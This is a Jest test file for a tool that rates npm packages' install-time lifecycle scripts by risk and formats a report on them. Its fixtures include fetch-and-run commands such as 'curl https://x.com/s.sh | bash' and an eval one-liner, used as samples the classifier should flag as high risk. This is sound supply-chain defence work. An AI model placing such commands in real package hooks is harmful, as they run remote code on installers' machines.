import {
  classifyScriptRisk,
  analyzeScripts,
  formatScriptsReport,
} from './scripts';
import { DependencyMap } from '../parser/lockfile';

describe('classifyScriptRisk', () => {
  it('returns none for empty scripts', () => {
    expect(classifyScriptRisk({}).risk).toBe('none');
  });

  it('flags high risk for curl pipe bash', () => {
    const result = classifyScriptRisk({
      postinstall: 'curl https://example.com/setup.sh | bash',
    });
    expect(result.risk).toBe('high');
    expect(result.flagged).toHaveLength(1);
  });

  it('flags high risk for eval(', () => {
    const result = classifyScriptRisk({ install: 'node -e "eval(data)"' });
    expect(result.risk).toBe('high');
  });

  it('flags medium risk for node -e', () => {
    const result = classifyScriptRisk({ postinstall: 'node -e "console.log(1)"' });
    expect(result.risk).toBe('medium');
    expect(result.flagged).toHaveLength(1);
  });

  it('flags low risk for plain postinstall', () => {
    const result = classifyScriptRisk({ postinstall: 'echo done' });
    expect(result.risk).toBe('low');
    expect(result.flagged).toContain('postinstall');
  });

  it('ignores non-lifecycle scripts', () => {
    const result = classifyScriptRisk({ build: 'tsc', test: 'jest' });
    expect(result.risk).toBe('none');
  });
});

describe('analyzeScripts', () => {
  const deps: DependencyMap = {
    'safe-pkg': { version: '1.0.0', resolved: '', integrity: '' },
    'risky-pkg': {
      version: '2.0.0',
      resolved: '',
      integrity: '',
      scripts: { postinstall: 'curl https://x.com/s.sh | bash' },
    } as any,
    'mild-pkg': {
      version: '3.0.0',
      resolved: '',
      integrity: '',
      scripts: { postinstall: 'echo hi' },
    } as any,
  };

  it('skips packages without scripts', () => {
    const result = analyzeScripts(deps);
    expect(result.entries.find((e) => e.name === 'safe-pkg')).toBeUndefined();
  });

  it('counts high and medium risk correctly', () => {
    const result = analyzeScripts(deps);
    expect(result.highRisk).toBe(1);
    expect(result.mediumRisk).toBe(0);
    expect(result.totalWithScripts).toBe(2);
  });
});

describe('formatScriptsReport', () => {
  it('returns message when no entries', () => {
    const out = formatScriptsReport({
      entries: [],
      totalWithScripts: 0,
      highRisk: 0,
      mediumRisk: 0,
    });
    expect(out).toContain('No packages');
  });

  it('includes risk badge in output', () => {
    const out = formatScriptsReport({
      entries: [
        {
          name: 'evil-pkg',
          version: '1.0.0',
          scripts: { postinstall: 'curl x | bash' },
          risk: 'high',
          flaggedScripts: ['postinstall: curl x | bash'],
        },
      ],
      totalWithScripts: 1,
      highRisk: 1,
      mediumRisk: 0,
    });
    expect(out).toContain('[HIGH]');
    expect(out).toContain('evil-pkg@1.0.0');
  });
});
